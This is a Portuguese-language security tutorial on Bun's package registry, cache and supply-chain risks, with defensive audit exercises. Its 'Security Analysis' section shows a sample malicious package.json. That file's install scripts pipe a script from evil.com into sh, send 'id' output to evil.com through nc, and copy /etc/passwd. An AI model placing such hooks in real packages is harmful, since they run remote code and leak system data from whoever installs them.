# Registry — Sistema de Pacotes do Bun

> Como Bun instala pacotes, interage com registries, e vetores de supply chain.

---

## Intuition (Feynman)

O registry de pacotes e como um repositorio central de software. Quando voce faz `bun add react`, o Bun baixa o pacote do registry (por padrao registry.npmjs.org), verifica a integridade, e instala no `node_modules`.

A velocidade do Bun vem de: requests paralelas, cache global agressivo, e extrair tarballs em Zig (mais rapido que Node.js). Mas "rapido" e "seguro" nao sao sinonimos.

---

## Source Code

No repositorio `oven-sh/bun`:
```
src/
├── install/
│   ├── install.zig        # Logica de instalacao
│   ├── registry.zig       # Comunicacao com registry
│   ├── lockfile.zig       # Gerenciamento de lockfile
│   └── resolution.zig     # Resolucao de versoes
└── ...
```

---

## Hands-On Analysis

### 1. Instalacao e Registry

```bash
# Registry padrao
bun config get registry
# https://registry.npmjs.org/

# Configurar registry alternativo (corporativo)
bun config set registry https://registry.empresa.com/

# Ou por .npmrc
echo "registry=https://registry.empresa.com/" > .npmrc

# Verificar o que sera instalado
bun add --dry-run react

# Instalar com informacoes verbosas
bun add express --verbose 2>&1 | head -30
```

### 2. Cache Global

```bash
# Bun mantem cache global para evitar downloads repetidos
ls ~/.bun/install/cache/ | head -10

# Estrutura do cache
ls ~/.bun/install/cache/react/ | head -5

# Limpar cache
bun cache rm react    # pacote especifico
bun cache rm          # tudo

# Ver tamanho do cache
du -sh ~/.bun/install/cache/
```

### 3. Informacoes do Pacote

```bash
# Ver info sem instalar
bun info express 2>/dev/null | head -20

# Ver versoes disponiveis
bun pm ls 2>/dev/null

# Verificar um pacote instalado
cat node_modules/express/package.json | jq '{name, version, scripts, main}'

# Verificar scripts de instalacao (RISCO!)
cat node_modules/express/package.json | jq '.scripts'
```

---

## Security Analysis

### Lifecycle Scripts (Principal Vetor de Supply Chain)

```json
// package.json de um pacote MALICIOSO
{
  "name": "useful-utility",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl https://evil.com/payload.sh | sh",
    "postinstall": "node -e \"require('child_process').exec('id | nc evil.com 4444')\"",
    "install": "python3 -c \"import os; os.system('cat /etc/passwd > /tmp/leak')\""
  }
}
```

```bash
# Verificar scripts de instalacao antes de instalar
npm pack --dry-run some-package 2>/dev/null | grep -E "preinstall|postinstall|install"

# Bun executa lifecycle scripts por padrao!
# Desabilitar:
bun install --ignore-scripts
```

### Dependency Confusion

```bash
# Ataque: publicar pacote publico com mesmo nome que pacote privado
# E versao maior (semver lookup prefere publica)

# Verificar se pacotes privados existem no npm publico
cat package.json | jq '.dependencies' | \
    jq -r 'keys[]' | while read pkg; do
        if curl -sf "https://registry.npmjs.org/$pkg" > /dev/null; then
            echo "[OK] $pkg existe no npm"
        else
            echo "[PRIVADO?] $pkg nao encontrado no npm"
        fi
    done
```

### Typosquatting

```bash
# Pacotes com nomes similares a populares
# expressjs vs express
# lodash vs 1odash (com numero 1)
# Verificar:

PACKAGE="requst" # typo de "request"
curl -sf "https://registry.npmjs.org/$PACKAGE" > /dev/null && \
    echo "TYPOSQUATTING: $PACKAGE existe!" || \
    echo "$PACKAGE nao existe"
```

---

## Exercises

### Ex P1.1 — Auditoria de Scripts

```bash
# Auditar todos os lifecycle scripts instalados
cat > /tmp/audit_scripts.sh << 'EOF'
#!/bin/bash
echo "=== Lifecycle Scripts em node_modules ==="

for pkg_json in node_modules/*/package.json; do
    pkg=$(basename $(dirname $pkg_json))
    scripts=$(cat "$pkg_json" | python3 -c "
import json,sys
d=json.load(sys.stdin)
s=d.get('scripts',{})
dangerous=['preinstall','postinstall','install','preuninstall']
for k in dangerous:
    if k in s:
        print(f'  {k}: {s[k][:80]}')
" 2>/dev/null)

    if [ -n "$scripts" ]; then
        echo ""
        echo "[$pkg]"
        echo "$scripts"
    fi
done
EOF
bash /tmp/audit_scripts.sh
```

### Ex P1.2 — Registry Interception

```bash
# Simular um registry alternativo para inspecionar requests

# 1. Iniciar um servidor HTTP simples que loga requests
cat > /tmp/fake_registry.ts << 'EOF'
Bun.serve({
    port: 4873,
    fetch(req) {
        const url = new URL(req.url);
        console.log(`[REGISTRY] ${req.method} ${url.pathname}`);
        // Redirecionar para registry real
        return fetch(`https://registry.npmjs.org${url.pathname}`);
    },
});
console.log("Registry fake na porta 4873");
EOF

bun /tmp/fake_registry.ts &
sleep 0.5

# 2. Configurar Bun para usar registry fake
BUN_CONFIG_REGISTRY=http://localhost:4873 bun add --dry-run express 2>&1 | head -10

kill %1 2>/dev/null
```

### Ex P1.3 — Supply Chain Fingerprint

```bash
# Verificar integridade de pacotes instalados
cat > /tmp/check_integrity.sh << 'EOF'
#!/bin/bash
echo "=== Verificando integridade via lockfile ==="

if [ -f "bun.lockb" ]; then
    # bun.lockb e binario — converter para JSON
    echo "lockfile encontrado (bun.lockb)"
    bun pm hash 2>/dev/null | head -5
else
    echo "Sem lockfile! Instale com 'bun install' primeiro"
fi

echo ""
echo "=== Pacotes sem hash no cache ==="
for pkg_json in node_modules/*/package.json; do
    pkg=$(basename $(dirname $pkg_json))
    cache_dir="$HOME/.bun/install/cache/$pkg"
    if [ ! -d "$cache_dir" ]; then
        echo "  [SEM CACHE] $pkg"
    fi
done | head -10
EOF
bash /tmp/check_integrity.sh
```

---

## Checkpoint

[ ] Entende como Bun usa o cache global
[ ] Verificou lifecycle scripts em um pacote instalado
[ ] Tentou instalar com `--ignore-scripts`
[ ] Entende os ataques: dependency confusion e typosquatting
[ ] Auditou scripts de instalacao no projeto

---

## Next

→ [`02-lockfile`](../02-lockfile/) — bun.lockb e integridade de dependencias
